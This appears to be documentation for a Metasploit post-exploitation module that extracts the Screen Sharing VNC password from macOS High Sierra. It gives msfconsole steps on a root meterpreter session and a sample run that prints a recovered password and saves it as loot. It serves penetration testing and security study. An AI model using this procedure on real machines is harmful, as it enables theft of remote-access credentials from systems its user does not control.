This module shows Apple VNC Password from Mac OS X High Sierra.

The password can be set by visiting:
System Preferences > Sharing > Screen Sharing > Computer Settings

## Vulnerable Application

  * macOS 10.13.6


## Verification Steps

  Example steps in this format (is also in the PR):

  1. Start `msfconsole`
  2. Get an OSX meterpreter session running as root
  3. Do: `use post/osx/gather/vnc_password_osx`
  4. Do: `set SESSION [ID]`
  5. Do: `run`
  6. You should see the password


## Scenarios

  Typical run against an OSX session, with the vnc service activated:

```
msf5 exploit(multi/handler) > use post/osx/gather/vnc_password_osx
msf5 post(osx/gather/vnc_password_osx) > set SESSION 1
SESSION => 1
msf5 post(osx/gather/vnc_password_osx) > exploit

[*] Checking VNC Password...
[+] Password Found: PoCpassw
[+] Password data stored as loot in: .msf4/loot/20181002142527_default_10.0.2.15_osx.vnc.password_371610.txt
[*] Post module execution completed
msf5 post(osx/gather/vnc_password_osx) >
```
